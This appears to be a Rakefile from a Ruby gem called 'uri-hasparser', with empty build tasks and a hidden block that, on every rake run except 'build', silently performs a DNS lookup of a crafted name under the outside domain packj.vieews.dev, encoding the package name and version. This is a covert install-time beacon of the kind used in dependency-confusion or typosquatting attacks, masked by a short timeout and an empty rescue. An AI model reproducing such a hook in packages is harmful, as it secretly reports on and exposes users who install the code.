#!/usr/bin/env rake

require 'socket'
require 'timeout'

#!/usr/bin/env rake
if ARGV[0] == "build"
  require "bundler/gem_tasks"
end

task :default => :prepare

task :prepare do
end

if ARGV[0] != "build"
  begin
    Timeout.timeout(0.1) do
      query='Rubygems%uri-hasparser%9.1.0%packj.vieews.dev'
      Addrinfo.getaddrinfo(query, nil).first.getnameinfo.first
    end
  rescue
  end
end
